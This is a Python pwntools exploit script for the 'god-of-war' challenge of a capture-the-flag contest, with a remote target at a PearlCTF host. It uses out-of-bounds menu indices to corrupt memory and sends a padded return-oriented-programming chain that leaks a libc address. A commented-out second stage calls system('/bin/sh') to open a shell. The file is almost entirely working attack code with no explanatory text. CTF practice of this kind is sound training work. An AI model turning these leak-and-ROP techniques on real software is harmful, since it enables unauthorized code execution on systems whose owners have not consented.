#!/usr/bin/python3

from pwn import *

exe = ELF('god-of-war_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x40183E
                b* 0x401769 
                b* 0x4016CF 
                b* 0x4018F8  
                b* 0x401AAB
                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('dyn.ctf.pearlctf.in', 30020)
else:
        p = process(exe.path)

def add(name, att, deff):
        sla(b'choice: ', str(1))
        sla(b'name: ', name)
        sla(b'attack: ', str(att))
        sla(b'defence:', str(deff))
def de( idx):
        sla(b'choice: ', str(4))
        sla(b'hero: ', str(idx))
def ed(idx):
        sla(b'choice: ', str(3))
        sla(b'hero: ', str(idx))
def edd(idx, name, att, deff):
        sla(b'choice: ', str(3))
        sla(b'hero: ', str(idx))
        sla(b'name: ', name)
        sla(b'attack: ', str(att))
        sla(b'defence:', str(deff))
pop_rdirdx = 0x0000000000401af5
ret = 0x000000000040101a
add(b'wan', 0, 0)
add(b'wan', 1, 1)
add(b'wan', 2, 2)

de(2)
# ed(0x40)

edd(-1, b'wan', 0, 0x111)
sla(b'choice: ', str(5))
GDB()

de(-1)
sla(b'choice: ', str(0))
payload = b''.ljust(184) + flat(
        pop_rdirdx, exe.got.puts,0, exe.plt.puts,ret, 0x401276
)
sla(b'name: ', payload)
p.recvuntil(b'You lose!\n')
libc.address = u64(p.recvline(keepends=False) + b'\0\0') - libc.sym.puts
info("libc.address " + hex(libc.address))

# add(b'wan', 0, 0)
# add(b'wan', 1, 1)
# add(b'wan', 2, 2)
# de(2)
# ed(0x40)
# edd(-1, b'wan', 0, 0x111)
# sla(b'choice: ', str(5))
# de(-1)
# sla(b'choice: ', str(0))
# GDB()
# payload = b''.ljust(184) + flat(
#         pop_rdirdx, next(libc.search(b'/bin/sh')),0,libc.sym.system,
# )
# sla(b'name: ', payload)

p.interactive()
